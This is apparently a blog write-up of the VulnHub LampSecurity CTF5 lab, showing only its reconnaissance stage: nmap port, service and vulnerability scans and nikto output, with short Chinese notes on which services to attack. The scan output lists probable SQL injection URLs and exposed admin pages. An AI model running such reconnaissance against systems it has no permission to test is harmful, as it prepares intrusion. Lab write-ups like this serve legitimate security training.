<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  LampSec-CTF5 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF5</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:29:19.558Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:36.999Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">6.3k</div></span><br><span>Read Time: <div class="control">37 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/xixi.jpg'><img src="/pic/xixi.jpg" alt="xixi"></p>
<span id="more"></span>

<h2 id="Info-Gather"><a href="#Info-Gather" class="headerlink" title="Info Gather"></a>Info Gather</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sn 192.168.56.0/24                     
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 15:38 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.1
Host is up <span class="token punctuation">(</span>0.00013s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:C0:00:08 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.2
Host is up <span class="token punctuation">(</span>0.00013s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:EC:CE:9E <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.00063s latency<span class="token punctuation">)</span>.
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.254
Host is up <span class="token punctuation">(</span>0.00042s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:FE:21:A5 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.132
Host is up.
Nmap done: 256 IP addresses <span class="token punctuation">(</span>5 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.08 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p- --min-rate<span class="token operator">=</span>10000 192.168.56.139
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 15:40 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.0017s latency<span class="token punctuation">)</span>.
Not shown: 65524 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE
22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>
25/tcp    <span class="token function">open</span>  smtp
80/tcp    <span class="token function">open</span>  http
110/tcp   <span class="token function">open</span>  pop3
111/tcp   <span class="token function">open</span>  rpcbind
139/tcp   <span class="token function">open</span>  netbios-ssn
143/tcp   <span class="token function">open</span>  imap
445/tcp   <span class="token function">open</span>  microsoft-ds
901/tcp   <span class="token function">open</span>  samba-swat
3306/tcp  <span class="token function">open</span>  mysql
53728/tcp <span class="token function">open</span>  unknown
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 6.57 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开了这么多端口，如此多的可能性。<br>可能比较好用的攻击向量：80-web, 139&amp;445-samba<br>然后是：53728，901，25，110，111<br>剩下其他的最后看。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sU -p- --min-rate<span class="token operator">=</span>10000 192.168.56.139                          
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 15:48 CST
Warning: 192.168.56.139 giving up on port because retransmission cap hit <span class="token punctuation">(</span>10<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.0014s latency<span class="token punctuation">)</span>.
Not shown: 65454 <span class="token function">open</span><span class="token operator">|</span>filtered udp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, 78 closed udp ports <span class="token punctuation">(</span>port-unreach<span class="token punctuation">)</span>
PORT      STATE SERVICE
111/udp   <span class="token function">open</span>  rpcbind
5353/udp  <span class="token function">open</span>  zeroconf
32768/udp <span class="token function">open</span>  omad
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 72.70 second
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>都可以看看。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,5353,32768,53728 192.168.56.139
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 15:54 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.00098s latency<span class="token punctuation">)</span>.

PORT      STATE  SERVICE     VERSION
22/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>         OpenSSH 4.7 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
25/tcp    <span class="token function">open</span>   smtp        Sendmail 8.14.1/8.14.1
80/tcp    <span class="token function">open</span>   http        Apache httpd 2.2.6 <span class="token variable"><span class="token punctuation">((</span>Fedora<span class="token punctuation">))</span></span>
110/tcp   <span class="token function">open</span>   pop3        ipop3d 2006k.101
111/tcp   <span class="token function">open</span>   rpcbind     2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
139/tcp   <span class="token function">open</span>   netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: MYGROUP<span class="token punctuation">)</span>
143/tcp   <span class="token function">open</span>   imap        University of Washington IMAP imapd 2006k.396 <span class="token punctuation">(</span>time zone: -0400<span class="token punctuation">)</span>
445/tcp   <span class="token function">open</span>   netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: MYGROUP<span class="token punctuation">)</span>
901/tcp   <span class="token function">open</span>   http        Samba SWAT administration server
3306/tcp  <span class="token function">open</span>   mysql       MySQL 5.0.45
5353/tcp  closed mdns
32768/tcp closed filenet-tms
53728/tcp <span class="token function">open</span>   status      1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Hosts: localhost.localdomain, 192.168.56.139<span class="token punctuation">;</span> OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 13.11 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap --script<span class="token operator">=</span>vuln 192.168.56.139
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 15:55 CST
Pre-scan script results:
<span class="token operator">|</span> broadcast-avahi-dos: 
<span class="token operator">|</span>   Discovered hosts:
<span class="token operator">|</span>     224.0.0.251
<span class="token operator">|</span>   After NULL UDP avahi packet DoS <span class="token punctuation">(</span>CVE-2011-1002<span class="token punctuation">)</span>.
<span class="token operator">|</span>_  Hosts are all up <span class="token punctuation">(</span>not vulnerable<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.0014s latency<span class="token punctuation">)</span>.
Not shown: 990 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
25/tcp   <span class="token function">open</span>  smtp
<span class="token operator">|</span> smtp-vuln-cve2010-4344: 
<span class="token operator">|</span>_  The SMTP server is not Exim: NOT VULNERABLE
80/tcp   <span class="token function">open</span>  http
<span class="token operator">|</span> http-csrf: 
<span class="token operator">|</span> Spidering limited to: maxdepth<span class="token operator">=</span>3<span class="token punctuation">;</span> maxpagecount<span class="token operator">=</span>20<span class="token punctuation">;</span> withinhost<span class="token operator">=</span>192.168.56.139
<span class="token operator">|</span>   Found the following possible CSRF vulnerabilities: 
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/?page<span class="token operator">=</span>contact
<span class="token operator">|</span>     Form id: 
<span class="token operator">|</span>     Form action: ?page<span class="token operator">=</span>contact
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>node<span class="token operator">&amp;</span>destination<span class="token operator">=</span>node
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>user/register
<span class="token operator">|</span>     Form id: user-register
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>user/register
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>user/password
<span class="token operator">|</span>     Form id: user-pass
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>user/password
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2009/04/29
<span class="token operator">|</span>     Form id: event-taxonomy-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2009/04/29
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2009/04/29
<span class="token operator">|</span>     Form id: event-type-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2009/04/29
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2009/04/29
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2009/04/29<span class="token operator">&amp;</span>destination<span class="token operator">=</span>event%2F2009%2F04%2F29
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/04/26/month
<span class="token operator">|</span>     Form id: event-taxonomy-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/04/26/month
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/04/26/month
<span class="token operator">|</span>     Form id: event-type-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/04/26/month
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/04/26/month
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/04/26/month<span class="token operator">&amp;</span>destination<span class="token operator">=</span>event%2F2023%2F04%2F26%2Fmonth
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event
<span class="token operator">|</span>     Form id: event-taxonomy-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event
<span class="token operator">|</span>     Form id: event-type-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event<span class="token operator">&amp;</span>destination<span class="token operator">=</span>event
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1
<span class="token operator">|</span>     Form id: event-taxonomy-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1
<span class="token operator">|</span>     Form id: event-type-filter-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>event/2023/03/01/month/all/all/1<span class="token operator">&amp;</span>destination<span class="token operator">=</span>event%2F2023%2F03%2F01%2Fmonth%2Fall%2Fall%2F1
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>node<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>destination<span class="token operator">=</span>node
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>node<span class="token operator">&amp;</span>destination<span class="token operator">=</span>node%3Famp%253Bdestination%3Dnode
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>blog
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>blog<span class="token operator">&amp;</span>destination<span class="token operator">=</span>blog
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>comment/reply/2
<span class="token operator">|</span>     Form id: comment-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>comment/reply/2
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>comment/reply/2
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>comment/reply/2<span class="token operator">&amp;</span>destination<span class="token operator">=</span>comment%2Freply%2F2
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>node/2
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>     Form action: /events/?q<span class="token operator">=</span>node/2<span class="token operator">&amp;</span>destination<span class="token operator">=</span>node%2F2
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.56.139:80/events/?q<span class="token operator">=</span>blog/1
<span class="token operator">|</span>     Form id: user-login-form
<span class="token operator">|</span>_    Form action: /events/?q<span class="token operator">=</span>blog/1<span class="token operator">&amp;</span>destination<span class="token operator">=</span>blog%2F1
<span class="token operator">|</span>_http-vuln-cve2017-1001000: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-dombased-xss: Couldn<span class="token string">'t find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server'</span>s resources causing Denial Of Service.
<span class="token operator">|</span>       
<span class="token operator">|</span>     Disclosure date: 2009-09-17
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       http://ha.ckers.org/slowloris/
<span class="token operator">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2007-6750
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /info.php: Possible information <span class="token function">file</span>
<span class="token operator">|</span>   /phpmyadmin/: phpMyAdmin
<span class="token operator">|</span>   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8
<span class="token operator">|</span>   /squirrelmail/images/sm_logo.png: SquirrelMail
<span class="token operator">|</span>   /icons/: Potentially interesting folder w/ directory listing
<span class="token operator">|</span>_  /inc/: Potentially interesting folder
<span class="token operator">|</span> http-fileupload-exploiter: 
<span class="token operator">|</span>   
<span class="token operator">|</span>_    Couldn<span class="token string">'t find a file-type field.
|_http-trace: TRACE is enabled
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider
|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|_    http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider
|_http-stored-xss: Couldn'</span>t <span class="token function">find</span> any stored XSS vulnerabilities.
110/tcp  <span class="token function">open</span>  pop3
111/tcp  <span class="token function">open</span>  rpcbind
139/tcp  <span class="token function">open</span>  netbios-ssn
143/tcp  <span class="token function">open</span>  imap
445/tcp  <span class="token function">open</span>  microsoft-ds
901/tcp  <span class="token function">open</span>  samba-swat
3306/tcp <span class="token function">open</span>  mysql
<span class="token operator">|</span>_mysql-vuln-cve2012-2122: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Host script results:
<span class="token operator">|</span>_smb-vuln-ms10-061: <span class="token boolean">false</span>
<span class="token operator">|</span>_smb-vuln-regsvc-dos: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_smb-vuln-ms10-054: <span class="token boolean">false</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 170.56 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>http-enum和http-sql-injection部分挺让人感兴趣。之后重点看看。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nikto -h 192.168.56.139          
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.139
+ Target Hostname:    192.168.56.139
+ Target Port:        80
+ Start Time:         2023-04-26 16:29:26 <span class="token punctuation">(</span>GMT8<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.2.6 <span class="token punctuation">(</span>Fedora<span class="token punctuation">)</span>
+ /: Retrieved x-powered-by header: PHP/5.2.4.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.6 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.54<span class="token punctuation">)</span>. Apache 2.2.34 is the EOL <span class="token keyword">for</span> the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <span class="token keyword">.</span>
+ /: Web Server returns a valid response with junk HTTP methods <span class="token function">which</span> may cause <span class="token boolean">false</span> positives.
+ /: HTTP TRACE method is active <span class="token function">which</span> suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /index.php: PHP include error may indicate local or remote <span class="token function">file</span> inclusion is possible.
+ /?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?<span class="token operator">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?<span class="token operator">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /phpmyadmin/changelog.php: phpMyAdmin is <span class="token keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with <span class="token function">file</span> /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Tue Aug 21 10:59:12 2029. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2003-1418
+ /phpmyadmin/ChangeLog: phpMyAdmin is <span class="token keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.
+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /mail/src/read_body.php: SquirrelMail found.
+ /squirrelmail/src/read_body.php: SquirrelMail found.
+ /info.php: Output from the phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> was found.
+ /info.php: PHP is installed, and a <span class="token function">test</span> script <span class="token function">which</span> runs phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default <span class="token function">file</span> found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
